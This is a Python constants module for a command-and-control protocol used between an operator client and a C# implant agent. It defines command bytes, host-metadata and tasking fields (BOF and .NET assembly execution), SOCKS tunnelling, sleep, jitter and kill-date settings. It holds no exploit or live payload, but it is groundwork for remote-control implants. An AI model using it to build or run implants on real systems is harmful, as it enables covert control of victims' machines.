"""
C2 protocol command bytes and TLV type constants.
Shared between client and agent (kept in sync manually with C# Constants.cs).
"""

from enum import IntEnum


# ─── Command bytes (first byte of decrypted payload) ───

class Command(IntEnum):
    CHECKIN_REQUEST     = 0x01
    CHECKIN_RESPONSE    = 0x02
    TASK_RESULT         = 0x03
    TASK_RESULT_ACK     = 0x04
    KEY_EXCHANGE_INIT   = 0x10
    KEY_EXCHANGE_RESP   = 0x11
    HEARTBEAT           = 0x20
    HEARTBEAT_ACK       = 0x21
    SOCKS_DATA          = 0xF0
    TERMINATE           = 0xFF


# ─── TLV type codes ───

class TlvType(IntEnum):
    # Agent metadata
    AGENT_ID            = 0x0001
    HOSTNAME            = 0x0002
    USERNAME            = 0x0003
    PID                 = 0x0004
    PPID                = 0x0005
    ARCH                = 0x0006
    OS_VERSION          = 0x0007
    INTEGRITY           = 0x0008
    IS_ADMIN            = 0x0009
    PROCESS_NAME        = 0x000A
    DOTNET_VERSION      = 0x000B
    AGENT_VERSION       = 0x000C
    CWD                 = 0x000D

    # Task fields
    TASK_ID             = 0x0100
    TASK_TYPE           = 0x0101
    MODULE_NAME         = 0x0102
    TASK_PAYLOAD        = 0x0103
    TASK_ARGUMENTS      = 0x0104
    TASK_TIMEOUT        = 0x0105

    # Result fields
    RESULT_STATUS       = 0x0200
    RESULT_OUTPUT       = 0x0201
    RESULT_ERROR_MSG    = 0x0202
    RESULT_TABLE_ROW    = 0x0203
    RESULT_FILE_CHUNK   = 0x0204
    RESULT_CHUNK_SEQ    = 0x0205
    RESULT_CHUNK_TOTAL  = 0x0206

    # Config fields
    CONFIG_SLEEP        = 0x0300
    CONFIG_JITTER       = 0x0301
    CONFIG_KILL_DATE    = 0x0302

    # SOCKS fields
    SOCKS_CONN_ID       = 0xF000
    SOCKS_TARGET        = 0xF001
    SOCKS_DATA_CHUNK    = 0xF002
    SOCKS_CLOSE         = 0xF003


# ─── Task types ───

class TaskType(IntEnum):
    NATIVE  = 0x01
    BOF     = 0x02
    ASSEMBLY = 0x03
    CONFIG  = 0x10
    EXIT    = 0xFF


# ─── Task statuses ───

class TaskStatus(IntEnum):
    PENDING  = 0
    SENT     = 1
    RUNNING  = 2
    COMPLETE = 3
    ERROR    = 4
    TIMEOUT  = 5


# ─── Architecture codes ───

class Arch(IntEnum):
    X86 = 0x01
    X64 = 0x02


# ─── Integrity levels ───

class Integrity(IntEnum):
    LOW     = 0
    MEDIUM  = 1
    HIGH    = 2
    SYSTEM  = 3


# ─── Result statuses ───

class ResultStatus(IntEnum):
    OK      = 0
    ERROR   = 1
    PARTIAL = 2


# ─── Callback types (BOF output) ───

class CallbackType(IntEnum):
    OUTPUT          = 0x00
    OUTPUT_OEM      = 0x1E
    OUTPUT_UTF8     = 0x20
    ERROR           = 0x0D
    TABLE_ROW       = 0x40
    FILE_CHUNK      = 0x50
    SCREENSHOT      = 0x60


# ─── Packet constants ───

DEFAULT_MAGIC = 0xDEADF00D
HEADER_SIZE = 12  # MAGIC(4) + SIZE(4) + MSG_ID(4)
